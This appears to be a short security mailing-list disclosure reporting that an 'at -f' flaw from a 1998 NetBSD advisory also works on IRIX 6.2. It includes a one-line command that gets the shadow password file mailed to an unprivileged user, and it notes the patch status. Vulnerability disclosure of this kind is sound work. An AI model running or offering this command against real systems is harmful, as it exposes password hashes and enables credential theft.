Subject:      more about 'at'

    I've tried the trick from NetBSD Security Advisory 1998-004
    on an IRIX 6.2 host, and it seems it works too.

        $ at -f /etc/shadow now + 1 minute
        -> shadow is mailed to user:

    'at' is:

        f 23947    91 patchSG0002866.eoe_sw.unix m usr/bin/at

    there is an earlier patch for a buffer overrun on at, I guess
    the fix is also included in patchSG0002866; but the '-f'
    bug is still present.

    (IRIX 5.3 has no problem since its 'at' lacks of '-f'
    switch)
